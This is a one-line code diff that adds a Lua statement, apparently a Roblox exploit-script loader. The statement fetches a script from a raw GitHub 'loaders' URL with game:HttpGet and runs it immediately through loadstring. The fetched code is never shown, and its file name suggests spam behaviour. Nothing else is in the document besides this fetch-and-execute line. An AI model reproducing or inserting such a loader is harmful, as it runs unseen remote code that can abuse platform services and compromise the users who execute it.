@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/wanted-update-spam2-fdk0epfgjnmnn2.lua"))()
